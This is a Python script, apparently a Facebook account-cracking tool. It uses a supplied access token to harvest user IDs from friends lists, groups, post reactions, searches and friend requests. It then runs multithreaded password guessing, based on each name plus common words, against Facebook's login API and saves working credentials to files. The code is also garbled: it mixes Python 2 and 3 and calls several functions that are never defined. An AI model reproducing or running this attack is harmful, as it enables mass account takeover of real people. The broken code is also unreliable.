#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 UNIS3X.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """
\033[1;97m ╔═════════════════════════════════════╗
\033[1;97m ║   \033[1;97m_   _ _   _ ___ ____ _______  __  \033[1;97m║  
\033[1;97m ║  \033[1;97m| | | | \ | |_ _/ ___|___ /\ \/ /  \033[1;97m║
\033[1;97m ║  \033[1;97m| | | |  \| || |\___ \ |_ \ \  /   \033[1;97m║
\033[1;97m ║  \033[1;97m| |_| | |\  || | ___) |__) |/  \   \033[1;97m║
\033[1;97m ║   \033[1;97m\___/|_| \_|___|____/____//_/\_\  \033[1;97m║
\033[1;97m ║                                     ║
\033[1;97m ╚═════════════════════════════════════╝
\033[1;97m ╔═════════════════════════════════════╗
\033[1;97m ║ Author : Virgiirhsy                 ║
\033[1;97m ║ Github : https://github.com/vrhasya ║
\033[1;97m ╚═════════════════════════════════════╝ """

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang Masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[1;97m ╔                                     ╗"
	print "\033[1;97m  [\033[1;97m01\033[1;97m]\033[1;96m\033[1;97m Login Menggunakan Token Facebook"
	print "\033[1;97m  [\033[1;91m00\033[1;97m]\033[1;96m\033[1;97m Keluar"
	print "\033[1;97m ╚                                     ╝"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m \033[1;97mToken FB: \033[1;93m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97m Jangan Lupa Follow Akun Pribadi Saya :)')
		jalan ('\033[1;97m[\033[1;91m•\033[1;97m•\033[1;97m]\033[1;92m Login Berhasil')
		os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
		menu()
	except KeyError:
		print "\033[1;97m[\033[1;93m!\033[1;97m] \033[1;93mToken Salah !"
		time.sleep(1.0)
		masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m Nama Akun\033[1;97m     ·\033[1;97m "+nama
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m User ID\033[1;97m       ·\033[1;97m "+id
	print "\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m Tanggal Lahir\033[1;97m ·\033[1;97m "+ a['birthday']
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack ID Indonesia"
	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack ID Group"
	print "\033[1;97m [\033[1;97m03\033[1;97m]\033[1;97m\033[1;97m Ambil ID"
	print "\033[1;97m [\033[1;97m04\033[1;97m]\033[1;97m\033[1;97m Ikuti Saya di Facebook"
	print "\033[1;97m [\033[1;91m00\033[1;97m]\033[1;97m\033[1;97m Logout"
	print "\033[1;97m ══════════════════════════════════════════"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		crack_likes()
	elif unikers =="3" or unikers =="03":
		dump()
	elif unikers =="4" or unikers =="04":
		saya()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def nid():
    r=ses.get(mbasic.format('/me'),cookies=kukis).text
    name=re.findall(r'<title>(.*?)</title>',r)[0]
    uid=re.findall(r'name="target" value="(.*?)"',r)[0]
    print("\033[00mName \033[91m: \033[93m"+name)
    print("\033[00mID   \033[91m: \033[93m"+uid)
    print('\033[91m<\033[90m---------------------\033[91m>\033[00m')
def temanid(url):
    req=requests.get(url,cookies=kukis).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
        elif 'friends' in x:
            continue
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if 'Lihat Teman Lain' in str(req):
        temanid(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))
    return id
def targetteman(url):
    req=requests.get(url,cookies=kukis).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
        elif 'friends' in x:
            continue
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if 'Lihat Teman Lain' in str(req):
        targetteman(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))
    return id
def like(url):
    try:
        req=requests.get(url,cookies=kukis).content
        lk=re.findall(r'href="(/ufi.*?)"',str(req))[0]
        aws=getlike(mbasic.format(lk))
        return aws
    except:
        print('\033[91mFailed To Crack\033[00m')
        sleep(1)
        menu()
def getlike(react):
    like=requests.get(react,cookies=kukis).content
    lkusr= re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
    for user in lkusr:
        if 'profile' in user[0]:
            id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split('/')[1])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if 'Lihat Selengkapnya' in str(like):
        getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
    return id 
def grupid(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'a class=".." href="/(.*?)">(.*?)</a>',str(req))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if "Lihat Selengkapnya" in str(req):
        grupid(mbasic.format(parser(req,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
    return id
def search(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'class="s cc"><a href="(.*?)"><div class=".."><div class="..">(.*?)</div></div>',str(req))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall("id=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split("?")[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if "Lihat Hasil Selanjutnya" in str(req):
        search(parser(req,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
    return id
def kmn(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for user in users:
        if "mbasic" in user[0]:
            id.append(user[1] + '|' + re.findall("uid=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + '|' + re.findall("=(\d*)",str(user[0]))[0])
        print(f"\r\033[00mTotal ID: \033[93m{str(len(id))}",end="")
    if "Lihat selengkapnya" in str(req):
        kmn(mbasic.format(parser(req,"html.parser").find("a",string="Lihat selengkapnya")["href"]))
    return id
def login(username,password,cek=False):
          global die,result,chek,count
          b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
          params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
          }
          api = 'https://b-api.facebook.com/method/auth.login'
          response = requests.get(api, params=params)
          if 'EAA' in response.text:
              print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username}\033[90m|\033[1;32m{password}                        ",end="")
              print()
              result += 1
              if cek:
                      vuln.append(username+"|"+password)
              else:
                      with open('vuln.txt','a') as f:
                           f.write(username + '|' + password + '\n')
          elif 'www.facebook.com' in response.json()['error_msg']:
                print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username}\033[90m|\033[1;33m{password}                      ",end="")
                print()
                chek += 1
                if cek:
                      check.append(username+"|"+password)
                else:
                      with open('check.txt','a') as f:
                           f.write(username + '|' + password + '\n')
          else:
                die += 1
          tk=['\033[1;97m#','\033[1;96m#','\033[1;97m#','\033[1;91m#']
          for o in tk:
                     print(f"\r\033[00m[{o}\033[00m] Life : \033[1;92m{str(result)} \033[00mCheck : \033[1;93m{str(chek)} \033[00mDie : \033[1;91m{str(die)}\033[00m",end="")
                     time.sleep(0.2)
def menu():
    clear()
    baner()
    nid()
    print('''
\033[93m1). \033[00mCrack From Friends
\033[93m2). \033[00mCrack From Target Friends
\033[93m3). \033[00mCrack From React Post
\033[93m4). \033[00mCrack From Group
\033[93m5). \033[00mCrack From Search
\033[93m6). \033[00mCrack From Requests Friends
\033[93m0). \033[00mExit''')
    pilih_menu()
def pilih_menu():
    ff=input('\033[00m>> \033[93m')
    if ff == '1':
       clear()
       baner()
       nid()
       usr=parser(ses.get(mbasic.format('/me'),cookies=kukis).content,'html.parser').find('a',string='Teman')
       username=temanid(mbasic.format(usr['href']))
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                aa=user.split('|')
                bb=aa[0].split(' ')
                for x in bb:
                    litpas=[
                         str(x) + '123',
                         str(x) + '1234',
                         str(x) + '12345',
                         str(x) + '123456'
                         ]
                    litpas.append('Sayang')
                    litpas.append('Bangsat')
                    litpas.append('Kontol')
                    litpas.append('Anjing')
                    for passw in set(litpas):
                        ex.submit(login,(aa[1]),(passw))
       print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '2':
       clear()
       baner()
       nid()
       asw=input('\033[00mTarget User: \033[93m')
       if asw.isdigit():
          asw='/profile.php?id='+asw
       else:
          asw='/'+asw
       try:
           usr=parser(ses.get(mbasic.format(asw),cookies=kukis).content,'html.parser').find('a',string='Teman')
           username=targetteman(mbasic.format(usr["href"]))
       except TypeError:
           print('\033[91mUser Not Found\033[00m')
           sleep(1)
           menu()
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                aa=user.split('|')
                bb=aa[0].split(' ')
                for x in bb:
                    litpas=[
                         str(x) + '123',
                         str(x) + '1234',
                         str(x) + '122',
                         str(x) + '1',
                         str(x) + '321',
                         str(x) + '12345',
                         str(x) + '123456'
                         ]
                    litpas.append('Sayang')
                    litpas.append('Bangsat')
                    litpas.append('Bajingan')
                    litpas.append('Rahasia')
                    litpas.append('Katasandi')
                    litpas.append('123456')
                    litpas.append('qwerty')
                    litpas.append('Indonesia')
                    litpas.append('Kontol')
                    litpas.append('Anjing')
                    for passw in set(litpas):
                        ex.submit(login,(aa[1]),(passw))
       print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '3':
         clear()
         baner()
         nid()
         asw=input('\033[00mPost?Url: \033[93m')
         if 'www.facebook' in asw:
             asw=asw.replace('www.facebook','mbasic.facebook')
         elif 'm.facebook.com' in asw:
             asw=asw.replace('m.facebook.com','mbasic.facebook.com')
         elif asw == '':
             print('\033[91mDont Be Empty!\033[00m')
             sleep(1)
             menu()
         username=like(asw)
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '4':
         clear()
         baner()
         nid()
         asw=input('\033[00mID Groups: \033[93m')
         username=grupid(mbasic.format('/browse/group/members/?id='+asw))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '5':
         clear()
         baner()
         nid()
         asw=input('\033[00mQuery: \033[93m')
         username=search(mbasic.format('/search/people/?q='+asw))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '6':
         clear()
         baner()
         nid()
         username=kmn(mbasic.format('/friends/center/requests/#friends_center_main'))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '0':
         sys.exit('\033[1;97mThanks For Using My Tools\n\033[91mexit\033[00m')
    else:
         print('\033[91mWrong Input!\033[00m')
         sleep(1)
         menu()
if __name__=="__main__":
     clear()
     baner()
     ses=requests.Session()
     kuki=masuk()
     kukis={'cookie':kuki}
     menu()
     
